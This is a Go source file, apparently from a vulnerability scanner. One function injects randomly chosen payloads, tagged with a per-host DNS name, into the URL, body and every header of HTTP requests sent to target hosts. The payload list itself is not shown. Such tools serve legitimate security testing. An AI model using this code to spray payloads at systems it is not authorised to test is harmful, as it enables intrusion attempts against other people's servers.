package main

import (
	"encoding/json"
	"fmt"
	"math/rand"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/valyala/fasthttp"
)

// processes a single host and a port on http level
func (p *ProcJob) ProcessHostHTTP(port string, wg *sync.WaitGroup) error {
	var host string
	body := make([]byte, 0)
	headers := make(map[string]string)

	if len(port) < 1 {
		host = p.Host
	} else {
		host = fmt.Sprintf("%s:%s", p.Host, port)
	}

	tmphost := strings.Split(host, "://")[1]
	thisTime := time.Now()
	fmt.Printf("\r%d/%02d/%02d %02d:%02d:%02d Total processed: %d  |  Current: %s  |  Protocol: %s",
		thisTime.Year(), thisTime.Month(), thisTime.Day(), thisTime.Hour(),
		thisTime.Minute(), thisTime.Second(), procCount, tmphost, p.Protocol)
	procCount++

	var dynamicPayloads []string
	sanitisedDnsName := strings.ReplaceAll(tmphost, ".", "-")
	sanitisedDnsName = strings.ReplaceAll(sanitisedDnsName, ":", "-")
	sanitisedDnsName = strings.ReplaceAll(sanitisedDnsName, "/", "-")
	for _, payload := range xload {
		dynamicPayloads = append(dynamicPayloads, strings.ReplaceAll(payload, "$DNSNAME$", sanitisedDnsName))
	}

	// generate a URL in format http://host/payload/?s=payload
	host = fmt.Sprintf("%s/?s=%s", host, url.QueryEscape(dynamicPayloads[rand.Intn(len(dynamicPayloads))]))

	// if user has supplied a format string for the body
	if len(hBody) > 0 {
		body = []byte(fmt.Sprintf(hBody, dynamicPayloads[rand.Intn(len(dynamicPayloads))]))
	} else {
		// these http methods are usually seen to have a body
		if p.Method == "POST" || p.Method == "PUT" || p.Method == "PATCH" {
			if useJson {
				var dJson struct {
					S string `json:"s"`
				}
				dJson.S = dynamicPayloads[rand.Intn(len(dynamicPayloads))]
				body, _ = json.Marshal(dJson)
			} else if useXML {
				dummyXML = fmt.Sprintf(
					`<?xml version="1.0" encoding="utf-8"?><Request>%s</Request>`,
					dynamicPayloads[rand.Intn(len(dynamicPayloads))])
				body = []byte(dummyXML)
			} else {
				body = []byte(dynamicPayloads[rand.Intn(len(dynamicPayloads))])
			}
		}
	}

	// if user has supplied custom headers for the requests
	if len(hHeaders) > 0 {
		for _, xhead := range strings.Split(hHeaders, ",") {
			headers[strings.TrimSpace(xhead)] = dynamicPayloads[rand.Intn(len(dynamicPayloads))]
		}
	} else {
		// log.Println("No custom headers supplied, using default set of standard headers.")
		for _, key := range defaultHTTPHeaders {
			headers[key] = dynamicPayloads[rand.Intn(len(dynamicPayloads))]
		}
	}

	req := cookHTTPRequest(p.Method, host, headers, body)
	resp := fasthttp.AcquireResponse()

	defer func() {
		fasthttp.ReleaseRequest(req)
		fasthttp.ReleaseResponse(resp)
		wg.Done()
	}()

	if err := httpClient.Do(req, resp); err != nil {
		return err
	}
	// since only a single host:port is being processed, we respect the
	// delay specified by the user to prevent overwhelming the server
	time.Sleep(time.Duration(delay) * time.Second)
	return nil
}
